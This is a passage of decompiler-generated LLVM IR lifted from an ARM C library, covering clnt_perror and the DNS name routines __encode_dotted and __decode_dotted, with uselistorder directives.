  uselistorder i32 ptrtoint (i32* @global_var_1dfb8.1075 to i32), { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__GI___glibc_strerror_r, { 2, 1, 0 }
  uselistorder i32 1024, { 16, 21, 11, 24, 17, 12, 13, 10, 25, 0, 34, 32, 14, 33, 9, 29, 30, 31, 15, 1, 2, 3, 4, 5, 6, 22, 23, 7, 8, 18, 26, 27, 20, 28, 19 }
  uselistorder i32 17, { 7, 0, 18, 1, 19, 16, 2, 12, 13, 14, 15, 3, 8, 4, 9, 5, 10, 6, 11, 20, 17 }
  uselistorder i32 14, { 1, 2, 4, 5, 6, 7, 0, 8, 9, 3 }
  uselistorder i32 13, { 2, 5, 6, 7, 0, 4, 3, 8, 1 }
  uselistorder i32 12, { 33, 55, 139, 140, 114, 115, 116, 0, 117, 10, 118, 56, 153, 154, 155, 58, 143, 36, 18, 57, 1, 19, 20, 96, 144, 4, 121, 21, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 145, 141, 142, 8, 59, 62, 63, 60, 61, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 146, 74, 6, 75, 49, 50, 22, 147, 23, 148, 24, 149, 15, 152, 76, 77, 78, 16, 158, 159, 160, 161, 162, 163, 17, 164, 165, 166, 167, 168, 169, 25, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 7, 5, 137, 150, 151, 26, 79, 105, 112, 80, 81, 170, 171, 172, 2, 106, 156, 11, 157, 12, 107, 3, 174, 27, 28, 122, 123, 124, 125, 177, 9, 138, 119, 120, 99, 13, 82, 83, 175, 84, 85, 113, 86, 173, 87, 88, 89, 90, 29, 51, 52, 53, 91, 92, 176, 93, 94, 95, 178, 30, 97, 98, 100, 101, 54, 102, 103, 14, 31, 34, 35, 32, 104, 108, 109, 110, 111, 126 }
  uselistorder i32 11, { 12, 19, 20, 7, 2, 17, 8, 27, 13, 14, 15, 21, 5, 6, 22, 23, 24, 25, 26, 1, 0, 3, 18, 9, 10, 4, 16, 11 }
  uselistorder i32 10, { 26, 20, 23, 4, 5, 29, 6, 7, 30, 31, 32, 33, 34, 25, 12, 24, 8, 35, 3, 36, 37, 38, 39, 10, 13, 2, 40, 14, 41, 15, 16, 17, 0, 27, 28, 18, 21, 22, 42, 9, 1, 11, 19 }
  uselistorder i32 9, { 8, 10, 11, 12, 13, 14, 3, 15, 9, 0, 4, 16, 17, 5, 22, 18, 19, 20, 21, 6, 2, 1, 7 }
  uselistorder i32 7, { 7, 5, 6, 15, 16, 12, 13, 2, 3, 8, 9, 10, 0, 14, 18, 17, 1, 4, 11 }
  uselistorder i32 6, { 8, 16, 17, 18, 10, 11, 12, 13, 2, 1, 14, 3, 9, 15, 19, 20, 4, 5, 22, 6, 7, 21, 0 }
  uselistorder i32 5, { 18, 35, 2, 30, 31, 32, 21, 6, 7, 36, 37, 38, 10, 22, 23, 11, 0, 8, 12, 3, 20, 24, 4, 25, 26, 13, 27, 5, 9, 1, 33, 34, 19, 28, 29, 14, 15, 16, 17 }
  uselistorder i32 (i32, i8*)* @strcpy, { 0, 1, 3, 10, 11, 12, 13, 14, 15, 2, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 ()* @__GI_clnt_sperrno, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @sprintf, { 4, 6, 5, 3, 1, 0, 2 }
  uselistorder i32 ()* @_buf, { 1, 0 }
  uselistorder i32* @r7, { 66, 5, 67, 68, 69, 70, 38, 39, 143, 145, 146, 144, 147, 148, 149, 150, 151, 152, 40, 41, 42, 43, 44, 45, 46, 3, 47, 48, 49, 50, 71, 72, 257, 251, 252, 253, 254, 255, 256, 200, 214, 215, 216, 225, 226, 227, 228, 153, 161, 160, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 217, 218, 219, 220, 221, 222, 223, 224, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 73, 74, 75, 258, 259, 260, 261, 13, 76, 0, 11, 229, 230, 231, 232, 233, 22, 23, 24, 25, 6, 1, 234, 235, 236, 237, 238, 249, 250, 77, 78, 79, 201, 202, 239, 240, 268, 80, 81, 82, 83, 4, 84, 85, 15, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 241, 242, 243, 244, 162, 245, 246, 247, 248, 163, 7, 164, 165, 8, 12, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 2, 26, 27, 264, 265, 266, 267, 166, 167, 168, 196, 197, 198, 199, 154, 155, 156, 157, 158, 159, 120, 121, 122, 123, 124, 105, 86, 87, 9, 88, 89, 262, 10, 263, 90, 91, 92, 93, 94, 95, 96, 97, 104, 137, 138, 28, 29, 30, 31, 32, 33, 133, 134, 135, 136, 34, 35, 36, 37, 129, 130, 131, 132, 125, 126, 127, 128, 98, 99, 100, 101, 102, 103, 106, 107, 108, 109, 139, 14, 140, 141, 142, 16, 17, 18, 19, 20, 21 }
  uselistorder label %dec_label_pc_1bddc, { 1, 0 }
  uselistorder label %dec_label_pc_1bdcc, { 14, 13, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder label %dec_label_pc_1bdc8, { 1, 0 }
  uselistorder label %dec_label_pc_1bdbc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1bda0, { 1, 0 }
  uselistorder label %dec_label_pc_1bd38, { 1, 0 }
}

define i32 @clnt_perror(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_1be0c = load i32, i32* @lr, align 4
  %v0_1be10 = call i32 @__GI_clnt_sperror()
  %v2_1be18 = load i32, i32* @global_var_2a890, align 4
  store i32 %v0_1be0c, i32* @lr, align 4
  %v2_1be20 = call i32 @__GI_fputs(i32 %v0_1be10, i32 %v2_1be18)
  %v0_1be24 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1be24, label %bb, label %bb2

bb:                                               ; preds = %entry
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  ret i32 %v2_1be20

; uselistorder directives
  uselistorder i1* @cpsr_z, { 3, 4, 5, 1, 6, 30, 31, 32, 33, 34, 35, 36, 37, 2, 7, 39, 8, 29, 9, 10, 11, 41, 40, 42, 12, 13, 14, 28, 15, 16, 17, 18, 19, 38, 20, 0, 24, 25, 21, 26, 22, 23, 27, 43, 44, 45 }
  uselistorder i32 (i32, i32)* @__GI_fputs, { 7, 6, 5, 4, 1, 3, 0, 2 }
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__encode_dotted(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_1be28 = load i32, i32* @r4, align 4
  store i32 %v3_1be28, i32* %stack_var_-24, align 4
  %v6_1be28 = load i32, i32* @r5, align 4
  %v9_1be28 = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_1be30 = load i32, i32* @r1, align 4
  store i32 %v0_1be30, i32* @r6, align 4
  %v0_1be34 = load i32, i32* @r2, align 4
  store i32 %v0_1be34, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1be9c19 = icmp slt i8* %arg1, null
  store i1 %v1_1be9c19, i1* %cpsr_n.global-to-local, align 1
  %v2_1be9c20 = icmp eq i8* %arg1, null
  store i1 %v2_1be9c20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1be9c20, label %dec_label_pc_1beb4, label %dec_label_pc_1bea8

dec_label_pc_1be40:                               ; preds = %dec_label_pc_1bea8
  %v2_1be40 = call i32 @__GI_strchr(i32 %v0_1be4021, i32 46)
  store i32 %v2_1be40, i32* @r5, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1be44 = icmp slt i32 %v2_1be40, 0
  store i1 %v1_1be44, i1* %cpsr_n.global-to-local, align 1
  %v2_1be44 = icmp eq i32 %v2_1be40, 0
  store i1 %v2_1be44, i1* %cpsr_z.global-to-local, align 1
  %v0_1be48 = load i32, i32* @r4, align 4
  %v2_1be48 = sub i32 %v2_1be40, %v0_1be48
  store i32 %v2_1be48, i32* %ip.global-to-local, align 4
  store i32 %v0_1be48, i32* %r0.global-to-local, align 4
  br i1 %v2_1be44, label %dec_label_pc_1be54, label %dec_label_pc_1be5c

dec_label_pc_1be54:                               ; preds = %dec_label_pc_1be40
  %v1_1be4c = inttoptr i32 %v0_1be48 to i8*
  %v3_1be54 = call i32 @strlen(i8* %v1_1be4c)
  store i32 %v3_1be54, i32* %r0.global-to-local, align 4
  %sext = mul i32 %v3_1be54, 16777216
  %v1_1be58 = sdiv i32 %sext, 16777216
  store i32 %v1_1be58, i32* %ip.global-to-local, align 4
  %v0_1be68.pre = load i32, i32* @r4, align 4
  %v0_1be78.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1be5c

dec_label_pc_1be5c:                               ; preds = %dec_label_pc_1be40, %dec_label_pc_1be54
  %v0_1be78 = phi i32 [ %v2_1be40, %dec_label_pc_1be40 ], [ %v0_1be78.pre, %dec_label_pc_1be54 ]
  %v0_1be68 = phi i32 [ %v0_1be48, %dec_label_pc_1be40 ], [ %v0_1be68.pre, %dec_label_pc_1be54 ]
  %v0_1be88 = phi i32 [ %v2_1be48, %dec_label_pc_1be40 ], [ %v1_1be58, %dec_label_pc_1be54 ]
  %v0_1be5c = load i32, i32* %r7.global-to-local, align 4
  %v1_1be5c = add i32 %v0_1be5c, 1
  store i32 %v1_1be5c, i32* @lr, align 4
  %v1_1be60 = load i32, i32* %r8.global-to-local, align 4
  %v2_1be60 = sub i32 %v1_1be60, %v0_1be5c
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1be64 = icmp slt i32 %v0_1be88, 0
  store i1 %v1_1be64, i1* %cpsr_n.global-to-local, align 1
  %v2_1be64 = icmp eq i32 %v0_1be88, 0
  store i1 %v2_1be64, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_1be68, i32* @r1, align 4
  %v0_1be6c = load i32, i32* @r6, align 4
  %v2_1be6c = add i32 %v0_1be6c, %v1_1be5c
  store i32 %v2_1be6c, i32* @r0, align 4
  store i32 %v0_1be88, i32* @r2, align 4
  %v1_1be74 = add i32 %v2_1be60, -1
  %v1_1be78 = add i32 %v0_1be78, 1
  store i32 %v1_1be78, i32* @r4, align 4
  br i1 %v2_1be64, label %.loopexit, label %dec_label_pc_1be80

dec_label_pc_1be80:                               ; preds = %dec_label_pc_1be5c
  %v2_1be80 = sub i32 %v0_1be88, %v1_1be74
  %v3_1be80 = icmp ult i32 %v0_1be88, %v1_1be74
  %v4_1be80 = xor i32 %v1_1be74, %v0_1be88
  %v5_1be80 = xor i32 %v2_1be80, %v0_1be88
  %v6_1be80 = and i32 %v5_1be80, %v4_1be80
  %v7_1be80 = icmp slt i32 %v6_1be80, 0
  store i1 %v7_1be80, i1* %cpsr_v.global-to-local, align 1
  %v8_1be80 = icmp slt i32 %v2_1be80, 0
  store i1 %v8_1be80, i1* %cpsr_n.global-to-local, align 1
  %v9_1be80 = icmp eq i32 %v0_1be88, %v1_1be74
  store i1 %v9_1be80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_1be80, label %dec_label_pc_1be88, label %.loopexit

dec_label_pc_1be88:                               ; preds = %dec_label_pc_1be80
  %v1_1be88 = trunc i32 %v0_1be88 to i8
  %v4_1be88 = add i32 %v0_1be6c, %v0_1be5c
  %v5_1be88 = inttoptr i32 %v4_1be88 to i8*
  store i8 %v1_1be88, i8* %v5_1be88, align 1
  %v0_1be8c = load i32, i32* @lr, align 4
  %v1_1be8c = load i32, i32* %ip.global-to-local, align 4
  %v2_1be8c = add i32 %v1_1be8c, %v0_1be8c
  store i32 %v2_1be8c, i32* %r7.global-to-local, align 4
  %v0_1be90 = call i32 @memcpy()
  store i32 %v0_1be90, i32* %r0.global-to-local, align 4
  %v0_1be94 = load i32, i32* @r5, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1be94 = icmp slt i32 %v0_1be94, 0
  store i1 %v1_1be94, i1* %cpsr_n.global-to-local, align 1
  %v2_1be94 = icmp eq i32 %v0_1be94, 0
  store i1 %v2_1be94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1be94, label %dec_label_pc_1beb4, label %dec_label_pc_1be88.dec_label_pc_1be9c_crit_edge

dec_label_pc_1be88.dec_label_pc_1be9c_crit_edge:  ; preds = %dec_label_pc_1be88
  %v0_1be9c.pre = load i32, i32* @r4, align 4
  store i32 %v0_1be9c.pre, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1be9c = icmp slt i32 %v0_1be9c.pre, 0
  store i1 %v1_1be9c, i1* %cpsr_n.global-to-local, align 1
  %v2_1be9c = icmp eq i32 %v0_1be9c.pre, 0
  store i1 %v2_1be9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1be9c, label %dec_label_pc_1beb4, label %dec_label_pc_1bea8

dec_label_pc_1bea8:                               ; preds = %entry, %dec_label_pc_1be88.dec_label_pc_1be9c_crit_edge
  %v0_1be4021 = phi i32 [ %v0_1be9c.pre, %dec_label_pc_1be88.dec_label_pc_1be9c_crit_edge ], [ %tmp, %entry ]
  %v1_1bea8 = inttoptr i32 %v0_1be4021 to i8*
  %v2_1bea8 = load i8, i8* %v1_1bea8, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1beac = icmp eq i8 %v2_1bea8, 0
  store i1 %v2_1beac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1beac, label %dec_label_pc_1beb4, label %dec_label_pc_1be40

dec_label_pc_1beb4:                               ; preds = %dec_label_pc_1be88.dec_label_pc_1be9c_crit_edge, %dec_label_pc_1be88, %dec_label_pc_1bea8, %entry
  %v0_1beb4 = load i32, i32* %r8.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1beb4 = icmp slt i32 %v0_1beb4, 0
  store i1 %v1_1beb4, i1* %cpsr_n.global-to-local, align 1
  %v2_1beb4 = icmp eq i32 %v0_1beb4, 0
  store i1 %v2_1beb4, i1* %cpsr_z.global-to-local, align 1
  %tmp16 = icmp slt i32 %v0_1beb4, 1
  br i1 %tmp16, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_1beb4
  %v5_1bebc = load i32, i32* %r7.global-to-local, align 4
  %v6_1bebc = add i32 %v5_1bebc, 1
  store i32 %v6_1bebc, i32* %r0.global-to-local, align 4
  %v7_1bec0 = load i32, i32* @r6, align 4
  %v9_1bec0 = add i32 %v7_1bec0, %v5_1bebc
  %v10_1bec0 = inttoptr i32 %v9_1bec0 to i8*
  store i8 0, i8* %v10_1bec0, align 1
  %v0_1bec4.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_1bec4.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_1bec4.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_1beb4, %bb
  %v2_1bec4 = phi i1 [ %v2_1bec4.pre, %bb ], [ false, %dec_label_pc_1beb4 ]
  %v1_1bec4 = phi i1 [ %v1_1bec4.pre, %bb ], [ %v1_1beb4, %dec_label_pc_1beb4 ]
  %v0_1bec4 = phi i1 [ %v0_1bec4.pre, %bb ], [ %v2_1beb4, %dec_label_pc_1beb4 ]
  %v3_1bec4 = xor i1 %v2_1bec4, %v1_1bec4
  %v4_1bec4 = or i1 %v0_1bec4, %v3_1bec4
  br i1 %v4_1bec4, label %.loopexit, label %bb18

bb18:                                             ; preds = %bb17
  %v7_1bec4 = load i32, i32* %stack_var_-24, align 4
  store i32 %v7_1bec4, i32* @r4, align 4
  store i32 %v6_1be28, i32* @r5, align 4
  store i32 %v9_1be28, i32* @r6, align 4
  %v25_1bec4 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v25_1bec4

.loopexit:                                        ; preds = %dec_label_pc_1be80, %dec_label_pc_1be5c, %bb17
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1becc = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_1becc, i32* @r4, align 4
  store i32 %v6_1be28, i32* @r5, align 4
  store i32 %v9_1be28, i32* @r6, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v0_1beb4, { 0, 2, 1 }
  uselistorder i32 %v0_1be9c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_1be94, { 1, 0 }
  uselistorder i32 %v2_1be80, { 1, 0 }
  uselistorder i32 %v1_1be74, { 2, 0, 3, 1 }
  uselistorder i32 %v0_1be88, { 2, 4, 0, 1, 5, 3, 6, 7, 8 }
  uselistorder i32 %v1_1be58, { 1, 0 }
  uselistorder i32 %v0_1be48, { 0, 2, 1, 3 }
  uselistorder i1 %v2_1be9c20, { 1, 0 }
  uselistorder i32 %v9_1be28, { 1, 0 }
  uselistorder i32 %v6_1be28, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 2, 7, 3, 8, 4, 6, 5, 1, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 0, 2 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 6, 7, 2, 3, 4, 5, 8 }
  uselistorder i1* %cpsr_v.global-to-local, { 0, 1, 6, 7, 2, 3, 4, 5, 8 }
  uselistorder i1* %cpsr_n.global-to-local, { 1, 2, 7, 8, 3, 4, 5, 6, 0 }
  uselistorder i32 16777216, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10, 12, 14, 13, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 42, 41 }
  uselistorder i32 (i8*)* @strlen, { 12, 38, 37, 33, 10, 9, 8, 7, 6, 5, 35, 11, 1, 34, 3, 0, 2, 36, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 13, 14, 4 }
  uselistorder i32 (i32, i32)* @__GI_strchr, { 2, 1, 0 }
  uselistorder i32 46, { 0, 4, 5, 2, 3, 1 }
  uselistorder i32* @r6, { 269, 270, 271, 272, 273, 274, 133, 34, 32, 134, 95, 3, 96, 97, 98, 99, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 28, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 5, 4, 100, 101, 102, 103, 104, 305, 6, 306, 307, 308, 309, 310, 311, 312, 105, 29, 106, 107, 108, 135, 136, 453, 449, 450, 33, 451, 26, 452, 388, 396, 397, 386, 387, 398, 7, 399, 400, 401, 193, 194, 313, 318, 317, 319, 320, 321, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 389, 390, 391, 392, 393, 8, 9, 394, 395, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 131, 129, 130, 132, 137, 138, 139, 454, 455, 459, 460, 140, 141, 142, 456, 10, 457, 458, 402, 403, 404, 405, 406, 46, 47, 12, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 11, 62, 61, 60, 63, 407, 408, 13, 409, 410, 446, 447, 448, 143, 144, 145, 411, 412, 413, 414, 415, 416, 417, 365, 366, 418, 419, 420, 421, 14, 422, 423, 424, 431, 432, 433, 434, 425, 426, 427, 428, 429, 430, 463, 489, 240, 241, 242, 146, 147, 148, 218, 219, 220, 221, 149, 150, 222, 223, 224, 225, 226, 227, 228, 229, 466, 467, 468, 469, 461, 462, 353, 354, 15, 355, 356, 357, 358, 359, 360, 367, 16, 368, 369, 435, 436, 437, 438, 439, 440, 441, 442, 330, 17, 0, 324, 325, 326, 327, 328, 18, 30, 329, 322, 2, 323, 443, 19, 444, 445, 331, 20, 332, 333, 230, 21, 231, 232, 370, 371, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 64, 65, 66, 372, 373, 374, 375, 485, 486, 487, 488, 35, 334, 335, 336, 337, 22, 338, 339, 340, 341, 314, 315, 316, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 233, 234, 235, 236, 237, 238, 239, 204, 161, 162, 23, 163, 470, 471, 24, 472, 473, 164, 165, 166, 27, 167, 36, 168, 169, 170, 171, 1, 474, 475, 476, 477, 478, 479, 480, 481, 484, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 482, 483, 183, 195, 196, 198, 197, 263, 264, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 361, 362, 363, 364, 255, 256, 257, 258, 247, 248, 249, 250, 259, 260, 261, 262, 85, 86, 87, 88, 89, 90, 91, 92, 251, 252, 253, 254, 93, 94, 243, 244, 245, 246, 184, 25, 185, 186, 187, 188, 189, 190, 191, 31, 192, 464, 465, 199, 200, 201, 202, 203, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 265, 266, 267, 268, 37, 38, 39, 40, 41, 42, 43, 44, 45, 216, 217 }
  uselistorder label %.loopexit, { 2, 0, 1 }
  uselistorder label %bb17, { 1, 0 }
  uselistorder label %dec_label_pc_1beb4, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1bea8, { 1, 0 }
  uselistorder label %dec_label_pc_1be5c, { 1, 0 }
}

define i32 @__decode_dotted() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_1bed0 = load i32, i32* @r4, align 4
  %v6_1bed0 = load i32, i32* @r5, align 4
  %v0_1bed4 = load i32, i32* @r0, align 4
  store i32 %v0_1bed4, i32* %sl.global-to-local, align 4
  %v2_1bed4 = icmp eq i32 %v0_1bed4, 0
  br i1 %v2_1bed4, label %.thread16, label %dec_label_pc_1bf74.preheader

.thread16:                                        ; preds = %entry
  %v0_1bee01 = load i32, i32* @r2, align 4
  store i32 %v0_1bee01, i32* %sb.global-to-local, align 4
  %v0_1bee42 = load i32, i32* @r3, align 4
  store i32 %v0_1bee42, i32* %stack_var_-40, align 4
  br label %dec_label_pc_1bf94

dec_label_pc_1bf74.preheader:                     ; preds = %entry
  store i32 0, i32* %r8.global-to-local, align 4
  %v0_1bee0 = load i32, i32* @r2, align 4
  store i32 %v0_1bee0, i32* %sb.global-to-local, align 4
  %v0_1bee4 = load i32, i32* @r3, align 4
  store i32 %v0_1bee4, i32* %stack_var_-40, align 4
  store i32 1, i32* %fp.global-to-local, align 4
  %v1_1bf743952 = load i32, i32* @r1, align 4
  %v2_1bf744053 = add i32 %v1_1bf743952, %v0_1bed4
  %v3_1bf744154 = inttoptr i32 %v2_1bf744053 to i8*
  %v4_1bf744255 = load i8, i8* %v3_1bf744154, align 1
  %v6_1bf744356 = zext i8 %v4_1bf744255 to i32
  store i32 %v6_1bf744356, i32* @r4, align 4
  %v2_1bf784457 = icmp eq i8 %v4_1bf744255, 0
  br i1 %v2_1bf784457, label %bb35, label %dec_label_pc_1bef8.lr.ph

dec_label_pc_1bef8:                               ; preds = %dec_label_pc_1bef8.lr.ph, %bb30
  %v2_1bf8050 = phi i1 [ %v2_1bf804663, %dec_label_pc_1bef8.lr.ph ], [ true, %bb30 ]
  %v6_1bf7448 = phi i32 [ %v6_1bf744361, %dec_label_pc_1bef8.lr.ph ], [ %v6_1bf74, %bb30 ]
  %v1_1bf7447 = phi i32 [ %v1_1bf743960, %dec_label_pc_1bef8.lr.ph ], [ %v5_1bf20, %bb30 ]
  %v1_1befc = and i32 %v6_1bf7448, 192
  br i1 %v2_1bf8050, label %bb28, label %bb

bb:                                               ; preds = %dec_label_pc_1bef8
  %v1_1bf00 = load i32, i32* %r8.global-to-local, align 4
  %v2_1bf00 = add i32 %v1_1bf00, 1
  store i32 %v2_1bf00, i32* %r8.global-to-local, align 4
  br label %bb28

bb28:                                             ; preds = %dec_label_pc_1bef8, %bb
  %v2_1bf04 = icmp eq i32 %v1_1befc, 192
  %v1_1bf08 = add i32 %v1_1bf7447, 1
  store i32 %v1_1bf08, i32* @r5, align 4
  br i1 %v2_1bf04, label %dec_label_pc_1bf10, label %dec_label_pc_1bf30

dec_label_pc_1bf10:                               ; preds = %bb28
  %v2_1bf10 = add i32 %v1_1bf08, %v0_1bf10.ph59
  %v3_1bf10 = inttoptr i32 %v2_1bf10 to i8*
  %v4_1bf10 = load i8, i8* %v3_1bf10, align 1
  %v6_1bf10 = zext i8 %v4_1bf10 to i32
  %v1_1bf18 = urem i32 %v6_1bf7448, 64
  br i1 %v2_1bf8050, label %bb30, label %bb29

bb29:                                             ; preds = %dec_label_pc_1bf10
  %v1_1bf1c = load i32, i32* %r8.global-to-local, align 4
  %v2_1bf1c = add i32 %v1_1bf1c, 1
  store i32 %v2_1bf1c, i32* %r8.global-to-local, align 4
  br label %bb30

bb30:                                             ; preds = %dec_label_pc_1bf10, %bb29
  %v4_1bf20 = mul nuw nsw i32 %v1_1bf18, 256
  %v5_1bf20 = or i32 %v6_1bf10, %v4_1bf20
  store i32 %v5_1bf20, i32* %r1.global-to-local, align 4
  store i32 %storemerge17.ph58, i32* %r7.global-to-local, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  %v2_1bf74 = add i32 %v5_1bf20, %v0_1bf10.ph59
  %v3_1bf74 = inttoptr i32 %v2_1bf74 to i8*
  %v4_1bf74 = load i8, i8* %v3_1bf74, align 1
  %v6_1bf74 = zext i8 %v4_1bf74 to i32
  store i32 %v6_1bf74, i32* @r4, align 4
  %v2_1bf78 = icmp eq i8 %v4_1bf74, 0
  br i1 %v2_1bf78, label %dec_label_pc_1bf80.bb36_crit_edge, label %dec_label_pc_1bef8

dec_label_pc_1bf30:                               ; preds = %bb28
  %v2_1bf30 = add i32 %v6_1bf7448, %storemerge17.ph58
  store i32 %v2_1bf30, i32* %r6.global-to-local, align 4
  %v2_1bf34 = load i32, i32* %stack_var_-40, align 4
  %v1_1bf38 = add i32 %v2_1bf30, 1
  store i32 %v1_1bf38, i32* %r7.global-to-local, align 4
  %v3_1bf3c = icmp ult i32 %v1_1bf38, %v2_1bf34
  br i1 %v3_1bf3c, label %dec_label_pc_1bf44, label %dec_label_pc_1bf94

dec_label_pc_1bf44:                               ; preds = %dec_label_pc_1bf30
  %v2_1bf44 = add i32 %v1_1bf08, %v0_1bf10.ph59
  store i32 %v2_1bf44, i32* @r1, align 4
  %v0_1bf48 = load i32, i32* %sb.global-to-local, align 4
  %v2_1bf48 = add i32 %v0_1bf48, %storemerge17.ph58
  store i32 %v2_1bf48, i32* @r0, align 4
  store i32 %v6_1bf7448, i32* @r2, align 4
  %v0_1bf50 = call i32 @memcpy()
  %v0_1bf54 = load i32, i32* @r5, align 4
  %v1_1bf54 = load i32, i32* @r4, align 4
  %v2_1bf54 = add i32 %v1_1bf54, %v0_1bf54
  store i32 %v2_1bf54, i32* %r1.global-to-local, align 4
  %v0_1bf58 = load i32, i32* %sl.global-to-local, align 4
  %v2_1bf58 = add i32 %v0_1bf58, %v2_1bf54
  %v3_1bf58 = inttoptr i32 %v2_1bf58 to i8*
  %v4_1bf58 = load i8, i8* %v3_1bf58, align 1
  %v0_1bf5c = load i32, i32* %fp.global-to-local, align 4
  %v2_1bf5c = icmp eq i32 %v0_1bf5c, 0
  br i1 %v2_1bf5c, label %bb32, label %bb31

bb31:                                             ; preds = %dec_label_pc_1bf44
  %v1_1bf60 = load i32, i32* %r8.global-to-local, align 4
  %v3_1bf60 = add i32 %v1_1bf60, %v1_1bf54
  store i32 %v3_1bf60, i32* %r8.global-to-local, align 4
  br label %bb32

bb32:                                             ; preds = %dec_label_pc_1bf44, %bb31
  %v2_1bf64 = icmp eq i8 %v4_1bf58, 0
  br i1 %v2_1bf64, label %bb34, label %bb33

bb33:                                             ; preds = %bb32
  br label %bb34

bb34:                                             ; preds = %bb32, %bb33
  %v0_1bf6c.off0 = phi i8 [ 0, %bb32 ], [ 46, %bb33 ]
  %v2_1bf6c = load i32, i32* %sb.global-to-local, align 4
  %v3_1bf6c = load i32, i32* %r6.global-to-local, align 4
  %v4_1bf6c = add i32 %v3_1bf6c, %v2_1bf6c
  %v5_1bf6c = inttoptr i32 %v4_1bf6c to i8*
  store i8 %v0_1bf6c.off0, i8* %v5_1bf6c, align 1
  %v0_1bf70.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_1bf74.pre.pre = load i32, i32* %sl.global-to-local, align 4
  %v0_1bf80.pre.pre = load i32, i32* %fp.global-to-local, align 4
  %v1_1bf7439 = load i32, i32* %r1.global-to-local, align 4
  %v2_1bf7440 = add i32 %v1_1bf7439, %v0_1bf74.pre.pre
  %v3_1bf7441 = inttoptr i32 %v2_1bf7440 to i8*
